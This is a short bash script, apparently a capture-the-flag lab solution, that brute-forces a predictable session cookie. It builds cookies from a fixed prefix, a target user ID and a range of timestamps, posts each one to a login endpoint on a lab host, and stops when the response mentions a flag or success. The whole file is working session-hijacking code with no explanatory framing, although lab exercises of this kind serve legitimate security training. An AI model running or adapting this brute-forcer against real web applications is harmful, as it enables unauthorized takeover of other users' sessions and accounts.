#!/bin/bash

# Variables for the Second Gap
URL="http://web0x01.hbtn/api/a1/hijack_session/login"
PREFIX="016673b9-463c-4969-a18"
TARGET_ID="2496228"

echo "Starting brute force for ID $TARGET_ID..."

# Use 'seq' to generate the numbers. 
# We look at range 770 to 790 (Gap was 773-780)
for i in $(seq 770 790); do
    
    # Construct the Timestamp
    TS="17690968$i"
    
    # Construct the Cookie
    COOKIE="hijack_session=$PREFIX-$TARGET_ID-$TS"
    
    # Send the request
    # We save output to a variable to keep the terminal clean
    response=$(curl -s -X POST "$URL" \
      -H 'Content-Type: application/json' \
      -H "Cookie: $COOKIE" \
      --data-raw '{"email":"fake@fake.com","password":"fake"}')

    # Check for success
    if echo "$response" | grep -iE "flag|success|congrats"; then
        echo "---------------------------------------------------"
        echo "[+] SUCCESS FOUND!"
        echo "[+] Timestamp: $TS"
        echo "[+] Cookie: $COOKIE"
        echo "[+] Response: $response"
        exit 0
    else
        echo "[-] Failed: $TS"
    fi
done

echo "Finished. If no flag found, try the other gaps."
